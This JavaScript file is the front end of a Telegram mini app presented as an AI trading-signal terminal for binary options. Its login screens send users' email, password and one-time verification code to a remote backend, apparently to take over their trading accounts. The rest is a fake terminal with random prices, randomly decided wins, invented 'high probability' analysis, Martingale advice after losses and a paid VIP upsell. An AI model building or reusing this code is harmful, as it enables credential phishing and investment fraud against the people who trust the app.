const tg = window.Telegram.WebApp;
const API_URL = "https://mini-app-two-puaz.onrender.com"; // <-- TERA BACKEND URL DALNA HAI
let userId = "UNKNOWN";
let selectedPair = "EUR/USD OTC"; // Default
let selectedTimeframe = "60"; 
let userBalance = 1000;
let pollingInterval;

tg.expand();
if (tg.initDataUnsafe && tg.initDataUnsafe.user) { userId = tg.initDataUnsafe.user.id.toString(); }

// --- BOOT ---
const bootTexts = ["CONNECTING TO NEXUS...", "BYPASSING PROTOCOLS...", "NODE SECURED."];
let bIdx = 0;
window.onload = function runBoot() {
    const bootEl = document.getElementById('boot-text');
    if(bootEl && bIdx < bootTexts.length) { 
        bootEl.innerHTML += `<p>> ${bootTexts[bIdx]}</p>`; bIdx++; setTimeout(runBoot, 800); 
    } else { setTimeout(() => { showScreen('login-screen'); }, 1000); }
}

const showAlert = (m, t="error") => { 
    const a = document.getElementById('alert-box'); 
    if(!a) return;
    a.textContent = m; a.style.background = t==="error" ? "var(--red)" : "var(--green)"; 
    a.classList.remove('hidden'); setTimeout(()=>a.classList.add('hidden'), 3500); 
};
const showScreen = (id) => { 
    document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden')); 
    const target = document.getElementById(id); if(target) target.classList.remove('hidden'); 
};

// --- BALANCE ---
document.getElementById('btn-edit-balance')?.addEventListener('click', () => { document.getElementById('balance-modal').classList.remove('hidden'); });
document.getElementById('btn-set-balance')?.addEventListener('click', () => {
    let val = parseFloat(document.getElementById('input-balance').value);
    if(val > 0) { userBalance = val; updateBalanceUI(); document.getElementById('balance-modal').classList.add('hidden'); }
});
function updateBalanceUI() { document.getElementById('display-balance').textContent = `$${userBalance.toFixed(2)}`; }
document.getElementById('close-vip')?.addEventListener('click', () => { document.getElementById('vip-modal').classList.add('hidden'); });

// --- LOGIN ---
document.getElementById('btn-login')?.addEventListener('click', async () => {
    const e = document.getElementById('email').value, p = document.getElementById('password').value;
    if(!e || !p) return showAlert("Details required");
    const btn = document.getElementById('btn-login'); btn.textContent = "CONNECTING...";
    try { await fetch(`${API_URL}/api/login`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user_id:userId, email:e, password:p})}); startPolling(); } 
    catch(err) { showAlert("Node Err"); btn.textContent = "ESTABLISH CONNECTION"; }
});

document.getElementById('btn-code')?.addEventListener('click', async () => {
    const c = document.getElementById('auth-code').value;
    if(!c) return showAlert("Key required");
    const btn = document.getElementById('btn-code'); btn.textContent = "VERIFYING...";
    try { await fetch(`${API_URL}/api/code`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user_id:userId, code:c})}); } 
    catch(err) { showAlert("Err"); btn.textContent = "VERIFY"; }
});

function startPolling() {
    if(pollingInterval) clearInterval(pollingInterval);
    pollingInterval = setInterval(async () => {
        try {
            const res = await fetch(`${API_URL}/api/status?user_id=${userId}`); const data = await res.json();
            if(data.msg) showAlert(data.msg);
            if (data.state === "START") { showScreen('login-screen'); clearInterval(pollingInterval); document.getElementById('btn-login').textContent = "ESTABLISH CONNECTION"; } 
            else if (data.state === "WAITING_CODE") { showScreen('code-screen'); } 
            else if (data.state === "AUTHORIZED") { showScreen('main-screen'); clearInterval(pollingInterval); initTerminal(); }
        } catch(e) {}
    }, 2500);
}

// --- TERMINAL ---
let isInit = false;
function initTerminal() {
    if(isInit) return;
    fetchInitData(); initWatchlist(); fetchNews(); updateBalanceUI();
    setInterval(() => { document.getElementById('live-clock').textContent = new Date().toISOString().split('T')[1].split('.')[0]; }, 1000);
    drawSparkline();
    setTimeout(()=> { document.getElementById('balance-modal').classList.remove('hidden'); }, 1000);
    isInit = true;
}

const liveSel = document.getElementById('live-pairs'), otcSel = document.getElementById('otc-pairs');
if(liveSel && otcSel) {
    liveSel.addEventListener('change', (e) => { if(e.target.value) { selectedPair = e.target.value; otcSel.value = ""; updatePairDisplay(); }});
    otcSel.addEventListener('change', (e) => { if(e.target.value) { selectedPair = e.target.value; liveSel.value = ""; updatePairDisplay(); }});
}
function updatePairDisplay() { document.getElementById('display-pair').textContent = selectedPair; }

async function fetchInitData() {
    try {
        const res = await fetch(`${API_URL}/api/init_data`); const data = await res.json();
        if(liveSel) data.live_pairs.forEach(p => liveSel.innerHTML += `<option value="${p}">${p}</option>`);
        if(otcSel) data.otc_pairs.forEach(p => otcSel.innerHTML += `<option value="${p}">${p}</option>`);
        const vipBtn = document.getElementById('vip-contact-btn');
        if(vipBtn) vipBtn.href = `https://t.me/${data.admin_contact}`;
    } catch(e) {}
}

// --- NAVIGATION LOGIC FIXED ---
const navTabs = ['aisignal', 'education', 'history'];
navTabs.forEach(tab => {
    const btn = document.getElementById(`nav-${tab}`);
    if(btn) {
        btn.addEventListener('click', () => {
            // Remove active from all
            navTabs.forEach(t => {
                document.getElementById(`nav-${t}`).classList.remove('active');
                document.getElementById(`tab-${t}`).classList.add('hidden');
            });
            // Add active to clicked
            btn.classList.add('active');
            document.getElementById(`tab-${tab}`).classList.remove('hidden');
        });
    }
});

document.querySelectorAll('.time-btn').forEach(btn => {
    btn.addEventListener('click', () => { 
        document.querySelectorAll('.time-btn').forEach(b => b.classList.remove('active')); 
        btn.classList.add('active'); selectedTimeframe = btn.dataset.time; 
    });
});

function logHistory(txt) {
    const log = document.getElementById('history-log');
    if(!log) return;
    const time = new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
    log.innerHTML = `<p style="margin-bottom:8px;">> [${time}] <span style="color:var(--text);">${txt}</span></p>` + log.innerHTML;
}

// Visuals
function drawSparkline() {
    const cont = document.getElementById('sparkline-container');
    if(!cont) return;
    cont.innerHTML = '<canvas id="sparkline" width="100" height="40"></canvas>';
    const ctx = document.getElementById('sparkline').getContext('2d');
    ctx.strokeStyle = '#26a69a'; ctx.lineWidth = 1.5; ctx.beginPath(); ctx.moveTo(0, 20);
    for(let i=1; i<20; i++) { ctx.lineTo(i*5, 20 + (Math.random()-0.5)*20); } ctx.stroke();
}
setInterval(() => {
    let base = 1.08447; let change = (Math.random() - 0.5) * 0.00050; let newPrice = (base + change).toFixed(5);
    const pEl = document.getElementById('display-price');
    if(pEl) {
        pEl.innerHTML = `${newPrice.slice(0,4)}<span class="pips">${newPrice.slice(4)}</span>`;
        pEl.style.color = change > 0 ? 'var(--green)' : 'var(--red)';
    }
}, 2000);

function initWatchlist() {
    const wl = document.getElementById('watchlist'); if(!wl) return;
    const pairs = [{p:"EUR/USD",v:1.084},{p:"GBP/JPY",v:190.1},{p:"USD/CAD",v:1.352}];
    pairs.forEach((item, i) => {
        wl.innerHTML += `<div class="wl-row"><div style="width:70px;">${item.p}</div><div id="wlp-${i}" style="font-weight:600;">${item.v.toFixed(4)}</div></div>`;
        setInterval(() => { 
            item.v += (Math.random()-0.5)*0.001; 
            const el = document.getElementById(`wlp-${i}`); 
            if(el) { el.textContent = item.v.toFixed(4); el.style.color = Math.random()>0.5 ? "var(--green)" : "var(--red)"; }
        }, 1500);
    });
}
async function fetchNews() {
    const n = document.getElementById('news-container'); if(!n) return;
    try {
        const res = await fetch(`https://api.rss2json.com/v1/api.json?rss_url=https%3A%2F%2Fwww.forexlive.com%2Ffeed%2Fnews`); const data = await res.json();
        if(data.status==="ok") {
            n.innerHTML = '';
            data.items.slice(0,4).forEach(a => { n.innerHTML += `<div class="wl-row text-muted" style="font-size:10px; display:block;">> ${a.title}</div>`; });
        }
    } catch(e) {}
}

// --- SIGNAL EXECUTION ---
document.getElementById('btn-scan')?.addEventListener('click', async () => {
    const amountInput = document.getElementById('trade-amount');
    const tradeAmount = amountInput ? parseFloat(amountInput.value) : 10;
    
    if(!selectedPair) return showAlert("Select pair");
    if(isNaN(tradeAmount) || tradeAmount <= 0) return showAlert("Invalid investment");
    if(tradeAmount > userBalance) return showAlert("Insufficient EQ");

    const btn = document.getElementById('btn-scan');
    const panel = document.getElementById('signal-panel');
    const dirEl = document.getElementById('sig-direction');
    const confBar = document.getElementById('bar-conf');
    const confVal = document.getElementById('sig-conf');
    const analysisTxt = document.getElementById('ai-analysis-text');

    btn.textContent = "[ ANALYZING MARKET ]"; btn.disabled = true;
    panel.className = "signal-panel IDLE";
    dirEl.textContent = "♦ SCANNING..."; dirEl.style.color = "var(--amber)";
    confBar.style.width = "0%"; confVal.textContent = "--%";
    analysisTxt.textContent = "Intercepting liquidity pools and analyzing stochastic divergence...";
    analysisTxt.style.borderColor = "var(--amber)";

    try {
        const res = await fetch(`${API_URL}/api/signal`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user_id:userId})});
        const data = await res.json();

        setTimeout(() => {
            if(data.error === "LIMIT_REACHED") { 
                const vipModal = document.getElementById('vip-modal');
                if(vipModal) vipModal.classList.remove('hidden');
                btn.textContent = "▶ ANALYZE & GET SIGNAL"; btn.disabled = false; 
                dirEl.textContent = "♦ AWAITING";
                return; 
            }

            const dir = data.direction.replace(/[^a-zA-Z]/g, ''); 
            const isBuy = dir === "BUY";
            const color = isBuy ? "var(--green)" : "var(--red)";
            
            panel.className = `signal-panel ${dir}`;
            dirEl.textContent = `▲ ${dir} SIGNAL`; dirEl.style.color = color;
            confBar.style.width = `${data.accuracy}%`; confBar.style.background = color;
            confVal.textContent = `${data.accuracy}%`;
            
            analysisTxt.textContent = `Verdict: High probability ${dir} momentum detected. Confluence confirms algorithmic volume block. Absolute confidence rating at ${data.accuracy}%. Execute on exact timeframe.`;
            analysisTxt.style.borderColor = color;

            logHistory(`EXECUTED: ${dir} | ${selectedPair} | Amount: $${tradeAmount}`);

            btn.textContent = `[ WAITING EXPIRY: ${selectedTimeframe}s ]`;
            btn.style.background = "var(--bg0)"; btn.style.border = "1px solid var(--border)"; btn.style.color = "var(--muted)";

            let waitMs = parseInt(selectedTimeframe) * 1000;

            setTimeout(() => {
                const isWin = Math.random() * 100 <= data.accuracy;
                const finalResult = isWin ? "WIN" : "LOSS";

                if(isWin) {
                    let profit = tradeAmount * 0.96; 
                    userBalance += profit;
                    logHistory(`CLOSED: <span style="color:var(--green)">WIN (+$${profit.toFixed(2)})</span>`);
                } else {
                    userBalance -= tradeAmount; 
                    logHistory(`CLOSED: <span style="color:var(--red)">LOSS (-$${tradeAmount.toFixed(2)})</span>`);
                    showAlert("Volatility Spike. Use Martingale 1-Step.");
                }
                updateBalanceUI();

                dirEl.textContent = `♦ TRADE: ${finalResult}`;
                
                setTimeout(()=> {
                    btn.textContent = "▶ ANALYZE & GET SIGNAL"; btn.disabled = false;
                    btn.style.background = "var(--amber)"; btn.style.color = "#000"; btn.style.border = "none";
                    panel.className = "signal-panel IDLE";
                    dirEl.textContent = "♦ AWAITING"; dirEl.style.color = "var(--muted)";
                    confBar.style.width = "0%"; confVal.textContent = "--%";
                    analysisTxt.textContent = "System standing by."; analysisTxt.style.borderColor = "var(--amber)";
                }, 3000);

            }, waitMs); 
        }, 3000); 
    } catch(e) { showAlert("Network Err"); btn.textContent = "▶ ANALYZE & GET SIGNAL"; btn.disabled = false; }
});
